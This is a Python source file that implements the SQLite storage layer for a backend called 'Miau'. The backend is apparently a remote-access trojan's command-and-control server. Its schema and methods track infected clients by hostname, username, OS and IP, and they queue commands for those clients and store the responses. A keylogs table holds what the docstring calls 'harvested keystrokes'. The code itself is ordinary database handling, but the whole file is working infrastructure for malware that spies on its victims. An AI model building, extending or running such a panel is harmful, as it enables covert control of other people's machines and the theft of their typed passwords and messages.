"""SQLite persistence for Miau backend.

Stores:
- tokens: per-client token + unique AES-GCM key + whitelist status
- clients: live metadata, last heartbeat, state
- commands: command queue + responses
- keylogs: harvested keystrokes
- events: client lifecycle events
"""
from __future__ import annotations

import json
import sqlite3
import threading
import time
from pathlib import Path
from typing import Any, Iterable


_SCHEMA = """
CREATE TABLE IF NOT EXISTS tokens (
    token       TEXT PRIMARY KEY,
    aes_key     BLOB NOT NULL,
    whitelist   INTEGER NOT NULL DEFAULT 1,
    created_at  INTEGER NOT NULL,
    label       TEXT DEFAULT ''
);

CREATE TABLE IF NOT EXISTS clients (
    token       TEXT PRIMARY KEY,
    install_id  TEXT UNIQUE,
    hostname    TEXT,
    username    TEXT,
    os          TEXT,
    arch        TEXT,
    client_ver  TEXT,
    state       TEXT DEFAULT 'offline',
    last_seen   INTEGER,
    last_ip     TEXT,
    created_at  INTEGER,
    sysinfo     TEXT DEFAULT '{}',
    pinned      INTEGER DEFAULT 0
);

CREATE TABLE IF NOT EXISTS commands (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    token       TEXT NOT NULL,
    cmd_type    INTEGER NOT NULL,
    args        TEXT DEFAULT '',
    blob        BLOB,
    issued_at   INTEGER NOT NULL,
    status      TEXT DEFAULT 'pending',
    responded_at INTEGER
);

CREATE TABLE IF NOT EXISTS responses (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    cmd_id      INTEGER NOT NULL,
    status      INTEGER NOT NULL,
    message     TEXT,
    data        BLOB,
    is_final    INTEGER DEFAULT 0,
    received_at INTEGER
);

CREATE TABLE IF NOT EXISTS keylogs (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    token       TEXT NOT NULL,
    window      TEXT,
    text        TEXT,
    ts          INTEGER
);

CREATE TABLE IF NOT EXISTS events (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    token       TEXT,
    kind        TEXT,
    detail      TEXT,
    ts          INTEGER
);

CREATE INDEX IF NOT EXISTS idx_cmd_token  ON commands(token, status);
CREATE INDEX IF NOT EXISTS idx_resp_cmd   ON responses(cmd_id);
CREATE INDEX IF NOT EXISTS idx_keylog_tok ON keylogs(token);
CREATE INDEX IF NOT EXISTS idx_events_tok ON events(token);
"""


class Store:
    def __init__(self, db_path: str | Path):
        self._path = str(db_path)
        self._lock = threading.Lock()
        self._conn = sqlite3.connect(self._path, check_same_thread=False)
        self._conn.row_factory = sqlite3.Row
        with self._lock:
            self._conn.executescript(_SCHEMA)
            self._conn.commit()

    # ---- tokens / aes keys ----

    def upsert_token(self, token: str, aes_key: bytes, label: str = "", whitelist: bool = True) -> None:
        with self._lock:
            self._conn.execute(
                "INSERT OR REPLACE INTO tokens(token, aes_key, whitelist, created_at, label) VALUES(?,?,?,?,?)",
                (token, aes_key, 1 if whitelist else 0, int(time.time()), label),
            )
            self._conn.commit()

    def get_token(self, token: str) -> sqlite3.Row | None:
        with self._lock:
            row = self._conn.execute("SELECT * FROM tokens WHERE token=?", (token,)).fetchone()
            return row

    def token_whitelisted(self, token: str) -> bool:
        row = self.get_token(token)
        return bool(row and row["whitelist"])

    def list_tokens(self) -> list[sqlite3.Row]:
        with self._lock:
            return self._conn.execute("SELECT * FROM tokens").fetchall()

    def delete_token(self, token: str) -> None:
        with self._lock:
            self._conn.execute("DELETE FROM tokens WHERE token=?", (token,))
            self._conn.execute("DELETE FROM clients WHERE token=?", (token,))
            self._conn.commit()

    # ---- clients ----

    def upsert_client(self, token: str, fields: dict[str, Any]) -> None:
        cols = ", ".join(fields.keys())
        ph = ", ".join("?" for _ in fields)
        with self._lock:
            self._conn.execute(
                f"INSERT INTO clients({cols}) VALUES({ph}) "
                f"ON CONFLICT(token) DO UPDATE SET {', '.join(f'{k}=excluded.{k}' for k in fields.keys())}",
                tuple(fields.values()),
            )
            self._conn.commit()

    def get_client(self, token: str) -> sqlite3.Row | None:
        with self._lock:
            return self._conn.execute("SELECT * FROM clients WHERE token=?", (token,)).fetchone()

    def list_clients(self) -> list[sqlite3.Row]:
        with self._lock:
            return self._conn.execute("SELECT * FROM clients ORDER BY last_seen DESC").fetchall()

    def set_state(self, token: str, state: str, last_ip: str | None = None) -> None:
        with self._lock:
            if last_ip:
                self._conn.execute(
                    "UPDATE clients SET state=?, last_seen=?, last_ip=? WHERE token=?",
                    (state, int(time.time()), last_ip, token),
                )
            else:
                self._conn.execute(
                    "UPDATE clients SET state=?, last_seen=? WHERE token=?",
                    (state, int(time.time()), token),
                )
            self._conn.commit()

    def touch(self, token: str, ip: str | None = None) -> None:
        with self._lock:
            if ip:
                self._conn.execute(
                    "UPDATE clients SET last_seen=?, last_ip=? WHERE token=?",
                    (int(time.time()), ip, token),
                )
            else:
                self._conn.execute(
                    "UPDATE clients SET last_seen=? WHERE token=?",
                    (int(time.time()), token),
                )
            self._conn.commit()

    def all_offline(self) -> None:
        with self._lock:
            self._conn.execute("UPDATE clients SET state='offline'")
            self._conn.commit()

    # ---- commands / responses ----

    def add_command(self, token: str, cmd_type: int, args: str = "", blob: bytes | None = None) -> int:
        with self._lock:
            cur = self._conn.execute(
                "INSERT INTO commands(token, cmd_type, args, blob, issued_at, status) VALUES(?,?,?,?,?, 'pending')",
                (token, cmd_type, args, blob, int(time.time())),
            )
            self._conn.commit()
            return int(cur.lastrowid)

    def pending_commands(self, token: str, limit: int = 100) -> list[sqlite3.Row]:
        with self._lock:
            rows = self._conn.execute(
                "SELECT * FROM commands WHERE token=? AND status='pending' ORDER BY id LIMIT ?",
                (token, limit),
            ).fetchall()
            if rows:
                ids = [r["id"] for r in rows]
                ph = ",".join("?" for _ in ids)
                self._conn.execute(f"UPDATE commands SET status='issued' WHERE id IN ({ph})", ids)
                self._conn.commit()
            return rows

    def mark_delivered(self, cmd_id: int) -> None:
        with self._lock:
            self._conn.execute("UPDATE commands SET status='delivered' WHERE id=?", (cmd_id,))
            self._conn.commit()

    def add_response(self, cmd_id: int, status: int, message: str, data: bytes | None, is_final: bool) -> None:
        with self._lock:
            self._conn.execute(
                "INSERT INTO responses(cmd_id, status, message, data, is_final, received_at) VALUES(?,?,?,?,?,?)",
                (cmd_id, status, message, data, 1 if is_final else 0, int(time.time())),
            )
            self._conn.execute("UPDATE commands SET status='done', responded_at=? WHERE id=?", (int(time.time()), cmd_id))
            self._conn.commit()

    def responses_for(self, cmd_id: int) -> list[sqlite3.Row]:
        with self._lock:
            return self._conn.execute(
                "SELECT * FROM responses WHERE cmd_id=? ORDER BY id", (cmd_id,)
            ).fetchall()

    def recent_commands(self, token: str, limit: int = 50) -> list[sqlite3.Row]:
        with self._lock:
            return self._conn.execute(
                "SELECT * FROM commands WHERE token=? ORDER BY id DESC LIMIT ?",
                (token, limit),
            ).fetchall()

    # ---- keylogs ----

    def add_keylog(self, token: str, window: str, text: str, ts: int) -> None:
        with self._lock:
            self._conn.execute(
                "INSERT INTO keylogs(token, window, text, ts) VALUES(?,?,?,?)",
                (token, window, text, ts),
            )
            self._conn.commit()

    def keylogs_for(self, token: str, limit: int = 500) -> list[sqlite3.Row]:
        with self._lock:
            return self._conn.execute(
                "SELECT * FROM keylogs WHERE token=? ORDER BY ts DESC LIMIT ?",
                (token, limit),
            ).fetchall()

    # ---- events ----

    def add_event(self, token: str | None, kind: str, detail: str) -> None:
        with self._lock:
            self._conn.execute(
                "INSERT INTO events(token, kind, detail, ts) VALUES(?,?,?,?)",
                (token, kind, detail, int(time.time())),
            )
            self._conn.commit()

    def events_for(self, token: str, limit: int = 200) -> list[sqlite3.Row]:
        with self._lock:
            return self._conn.execute(
                "SELECT * FROM events WHERE token=? ORDER BY ts DESC LIMIT ?",
                (token, limit),
            ).fetchall()
